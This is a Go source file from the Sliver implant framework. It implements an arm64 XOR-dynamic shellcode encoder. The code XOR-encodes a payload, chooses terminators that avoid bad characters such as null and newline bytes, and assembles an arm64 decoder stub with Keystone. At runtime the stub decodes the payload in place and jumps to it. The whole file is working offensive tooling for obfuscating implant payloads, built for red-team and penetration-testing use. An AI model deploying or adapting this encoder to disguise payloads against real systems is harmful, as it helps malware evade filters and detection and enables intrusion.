package arm64

/*
	Sliver Implant Framework
	Copyright (C) 2026  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"strings"

	"github.com/moloch--/go-keystone"
)

// xorDynamicBadchars are used when generating/selecting terminators and keys.
// Note: unlike the amd64 Metasploit xor_dynamic implementation, the arm64
// decoder stub is not guaranteed to be badchar-free.
var xorDynamicBadchars = map[byte]bool{
	0x00: true,
	0x0a: true,
	0x0d: true,
}

// XorDynamic encodes an arm64 payload using a dynamic XOR scheme with:
//
//	stub + key + keyTerm + encodedPayload + payloadTerm
//
// If key includes a trailing key terminator + payload terminator (3 bytes) that satisfy the
// encoder constraints, those are used verbatim.
func XorDynamic(data []byte, key []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("xor_dynamic encoder: empty payload")
	}
	if len(key) == 0 {
		return nil, fmt.Errorf("xor_dynamic encoder: empty key")
	}

	coreKey := key
	var keyTerm byte
	var payloadTerm []byte

	encoded := xorDynamicEncode(data, key)
	explicit := false

	if candidateKey, candidateKeyTerm, candidatePayloadTerm, ok := splitExplicitTerms(data, key); ok {
		coreKey = candidateKey
		keyTerm = candidateKeyTerm
		payloadTerm = candidatePayloadTerm
		encoded = xorDynamicEncode(data, coreKey)
		explicit = true
	}

	if containsBadchars(coreKey, xorDynamicBadchars) {
		return nil, fmt.Errorf("xor_dynamic encoder: key contains badchars")
	}

	if !explicit {
		var err error
		keyTerm, err = selectKeyTerm(coreKey)
		if err != nil {
			return nil, err
		}
		payloadTerm, err = selectPayloadTerm(encoded)
		if err != nil {
			return nil, err
		}
	} else {
		if bytes.IndexByte(coreKey, keyTerm) != -1 {
			return nil, fmt.Errorf("xor_dynamic encoder: key contains key terminator")
		}
		if bytes.Contains(encoded, payloadTerm) {
			return nil, fmt.Errorf("xor_dynamic encoder: encoded payload contains payload terminator")
		}
	}

	stub, err := buildXorDynamicStub(keyTerm, payloadTerm)
	if err != nil {
		return nil, err
	}

	final := make([]byte, 0, len(stub)+len(coreKey)+1+len(encoded)+len(payloadTerm))
	final = append(final, stub...)
	final = append(final, coreKey...)
	final = append(final, keyTerm)
	final = append(final, encoded...)
	final = append(final, payloadTerm...)

	return final, nil
}

func xorDynamicEncode(data []byte, key []byte) []byte {
	encoded := make([]byte, len(data))
	for i := range data {
		encoded[i] = data[i] ^ key[i%len(key)]
	}
	return encoded
}

func splitExplicitTerms(data []byte, key []byte) ([]byte, byte, []byte, bool) {
	if len(key) < 4 {
		return nil, 0, nil, false
	}

	candidateKey := key[:len(key)-3]
	if len(candidateKey) == 0 {
		return nil, 0, nil, false
	}

	keyTerm := key[len(key)-3]
	payloadTerm := key[len(key)-2:]

	if xorDynamicBadchars[keyTerm] || xorDynamicBadchars[payloadTerm[0]] || xorDynamicBadchars[payloadTerm[1]] {
		return nil, 0, nil, false
	}

	if bytes.IndexByte(candidateKey, keyTerm) != -1 {
		return nil, 0, nil, false
	}

	if containsBadchars(candidateKey, xorDynamicBadchars) {
		return nil, 0, nil, false
	}

	encoded := xorDynamicEncode(data, candidateKey)
	if bytes.Contains(encoded, payloadTerm) {
		return nil, 0, nil, false
	}

	return candidateKey, keyTerm, append([]byte{}, payloadTerm...), true
}

func selectKeyTerm(key []byte) (byte, error) {
	for _, b := range allowedDynamicChars() {
		if bytes.IndexByte(key, b) == -1 {
			return b, nil
		}
	}
	return 0, fmt.Errorf("xor_dynamic encoder: key terminator not found")
}

func selectPayloadTerm(encoded []byte) ([]byte, error) {
	allowed := allowedDynamicChars()
	for _, first := range allowed {
		for _, second := range allowed {
			term := []byte{first, second}
			if !bytes.Contains(encoded, term) {
				return term, nil
			}
		}
	}
	return nil, fmt.Errorf("xor_dynamic encoder: payload terminator not found")
}

func allowedDynamicChars() []byte {
	allowed := make([]byte, 0, 255)
	for i := 1; i <= 255; i++ {
		b := byte(i)
		if xorDynamicBadchars[b] {
			continue
		}
		allowed = append(allowed, b)
	}
	return allowed
}

func buildXorDynamicStub(keyTerm byte, payloadTerm []byte) ([]byte, error) {
	if len(payloadTerm) != 2 {
		return nil, fmt.Errorf("xor_dynamic encoder: payload terminator must be 2 bytes")
	}

	engine, err := keystone.NewEngine(keystone.ARCH_ARM64, keystone.MODE_LITTLE_ENDIAN)
	if err != nil {
		return nil, err
	}
	defer func() { _ = engine.Close() }()

	payloadVal := binary.LittleEndian.Uint16(payloadTerm)

	src := strings.Join([]string{
		"adr x0, payload",   // x0 = key start
		"mov x1, x0",        // x1 = scan pointer
		"find_key_term:",    //
		"ldrb w2, [x1], #1", // read key byte
		fmt.Sprintf("cmp w2, #0x%02X", keyTerm),
		"b.ne find_key_term", // keep scanning
		"mov x8, x1",         // x8 = payload start / jump target
		"mov x3, x1",         // x3 = payload decode pointer
		"mov x4, x0",         // x4 = key decode pointer
		fmt.Sprintf("mov w10, #0x%04X", payloadVal),
		"decode_loop:",
		"ldrb w5, [x4], #1", // load key byte
		fmt.Sprintf("cmp w5, #0x%02X", keyTerm),
		"b.ne have_key",
		"mov x4, x0",        // reset key pointer
		"ldrb w5, [x4], #1", // load first key byte
		"have_key:",
		"ldrb w6, [x3]", // load payload byte
		"eor w6, w6, w5",
		"strb w6, [x3], #1", // store + advance payload
		"ldrh w7, [x3]",     // check for payload terminator (2 bytes)
		"cmp w7, w10",
		"b.ne decode_loop",
		"br x8", // jump to decoded payload
		"payload:",
	}, "\n")

	inst, err := engine.Assemble(src, 0)
	if err != nil {
		return nil, err
	}
	if len(inst) == 0 || len(inst)%4 != 0 {
		return nil, fmt.Errorf("xor_dynamic encoder: unexpected stub length %d", len(inst))
	}
	return inst, nil
}

func containsBadchars(data []byte, badchars map[byte]bool) bool {
	for _, b := range data {
		if badchars[b] {
			return true
		}
	}
	return false
}
